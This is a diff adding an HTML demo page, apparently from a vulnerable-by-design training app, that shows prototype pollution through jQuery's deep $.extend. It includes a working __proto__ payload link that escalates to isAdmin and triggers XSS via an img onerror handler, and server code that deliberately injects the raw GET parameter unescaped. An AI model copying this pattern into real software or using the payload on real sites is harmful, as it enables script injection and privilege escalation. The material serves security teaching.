@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Prototype Pollution</title>
+    <link rel='stylesheet' href='/stylesheets/style.css' />
+    <script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
+
+  </head>
+  <body>
+    <h1>Prototype Pollution</h1>
+    <p>This is a regular jQuery page, that use src parameter for getting JSON and parse it</p>
+    <pre>
+    const userObject = {
+      name: 'Ran',
+    }
+    
+    const payload = '{JSON_FROM_GET}' || '{}';
+    
+    const defaultObject = {
+      searchParam1: 'searchParam1',
+    };
+    
+    
+    let mySearchParams = $.extend(true, defaultObject, JSON.parse(payload))
+    
+    // Do somestuff like printing it out, or fetching information
+    
+    if (userObject.isAdmin && userObject.text) {
+      $('body').html(userObject.text);
+    }
+    </pre>
+    <a href="/examples/prototype-pollution?src={%22__proto__%22:%20{%22isAdmin%22:%20true,%20%22text%22:%20%22%3Cimg%20src=`//ddd`%20onerror=alert(1)%20/%3E%22}}">Attack</a>
+    
+    <script>
+    // Comes from server
+    const userObject = {
+      name: 'Ran',
+    }
+    
+    // const payload = '{"__proto__": {"isAdmin": true, "text": "<img src=`//ddd` onerror=alert(1) />"}}';
+    const payload = '<%- allGETParams['src'] %>' || '{}';
+    
+    const defaultObject = {
+      searchParam1: 'searchParam1',
+    };
+    
+    
+    let mySearchParams = $.extend(true, defaultObject, JSON.parse(payload))
+    
+    // Do somestuff like printing it out, or fetching information
+    
+    if (userObject.isAdmin && userObject.text) {
+      $('body').html(userObject.text);
+    }
+    </script>
+  
+</html>
